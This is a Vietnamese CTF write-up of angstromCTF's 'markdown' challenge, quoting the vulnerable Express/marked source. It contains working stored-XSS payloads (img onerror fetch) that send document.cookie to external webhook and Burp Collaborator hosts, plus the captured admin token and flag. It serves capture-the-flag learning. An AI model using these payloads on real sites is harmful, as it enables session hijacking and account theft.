# Markdown 

## description 

+ đây là dạng xss cookie stealing đã có 1 bài tương tự là static-pastebin của redpwn 


![image](https://github.com/j10nelop/m3d1r/assets/152776722/65cc1577-f544-4eec-ba72-496632b65821)


- ta có 2 link :

   https://markdown.web.actf.co/ => là để chèn content vào

   https://admin-bot.actf.co/markdown => là để share trên link này từ content đã được chèn

+ ta có thông tin về code index.js

```
const crypto = require('crypto')

const express = require('express')
const app = express()

const posts = new Map()

app.use(express.urlencoded({ extended: false }))

app.get('/', (_req, res) => {
    const placeholder = [
        '# Note title',
        'Content of the note. You can use *italics*!',
    ].join('\n')

    res.type('text/html').end(`
        <link rel="stylesheet" href="/style.css">
        <div class="content">
            <h1>Pastebin</h1>
            <form action="/create" method="POST">
                <textarea name="content">${placeholder}</textarea>
                <button type="submit">Create</button>
            </form>
        </div>
    `)
})

app.get('/flag', (req, res) => {
    const cookie = req.headers.cookie ?? ''
    res.type('text/plain').end(
        cookie.includes(process.env.TOKEN)
        ? process.env.FLAG
        : 'no flag for you'
    )
})

app.get('/view/:id', (_req, res) => {
    const marked = (
        'https://cdnjs.cloudflare.com/ajax/libs/marked/4.2.2/marked.min.js'
    )

    res.type('text/html').end(`
        <link rel="stylesheet" href="/style.css">
        <div class="content">
        </div>
        <script src="${marked}"></script>
        <script>
            const content = document.querySelector('.content')
            const id = document.location.pathname.split('/').pop()

            delete (async () => {
                const response = await fetch(\`/content/\${id}\`)
                const text = await response.text()
                content.innerHTML = marked.parse(text)
            })()
        </script>
    `)
})

app.post('/create', (req, res) => {
    const data = req.body.content ?? ''
    const id = crypto.randomBytes(8).toString('hex')
    posts.set(id, data)
    res.redirect(`/view/${id}`)
})

app.get('/content/:id', (req, res) => {
    const id = req.params.id
    const data = posts.get(id) ?? ''
    res.type('text/plain').end(data)
})

app.get('/style.css', (_req, res) => {
    res.type('text/css').end(`
        * {
          font-family: system-ui, -apple-system, BlinkMacSystemFont,
            'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
          box-sizing: border-box;
        }

        html,
        body {
          margin: 0;
        }

        .content {
          padding: 2rem;
          width: 90%;
          max-width: 900px;
          margin: auto;
        }

        input:not([type='submit']) {
          width: 100%;
          padding: 8px;
          margin: 8px 0;
        }

        textarea {
          width: 100%;
          padding: 8px;
          margin: 8px 0;
          resize: vertical;
          font-family: monospace;
        }

        input[type='submit'] {
          margin-bottom: 16px;
        }


    `)
})

app.listen(3000)
```

+ ta tìm được thông tin để lấy được flag ta sẽ phải tỉm ra session token code nếu không thì sẽ in ra no flag

+ ta sẽ dùng payload xss stealing token bằng cách sử dụng 1 web để hooked data từ server  

Webhook

```
https://pipedream.com
https://webhook.site/
brupsuite.pro collaborator
```

payload webhook steal cookie

```
><img src=x onerror='fetch("<Request_url>/?q="+document.cookie);'>

<img src="x" onerror="fetch('https://eobebcvkp2ou15v.m.pipedream.net/?q=' +(document.cookie));">
```

## exploit 

+ ta sử dụng brup collaborator và payload


payload solve
```
<img src="x" onerror="fetch('https://mf507brz66qf4sksfh4a5lgi79d01p.oastify.com/?q=' +(document.cookie));">
```

![image](https://github.com/j10nelop/m3d1r/assets/152776722/04f95e41-29a1-43e1-8878-d36995254f34)

=> poll request từ admin bot 'token = d15453b0234690ccbb91861e'

add token in cookie editor in https://markdown.web.actf.co/flag

![image](https://github.com/j10nelop/m3d1r/assets/152776722/3f56aba3-4d8c-4ece-8cad-1548026c38ad)

=> flag:actf{b534186fa8b28780b1fcd1e95e2a2e2c}
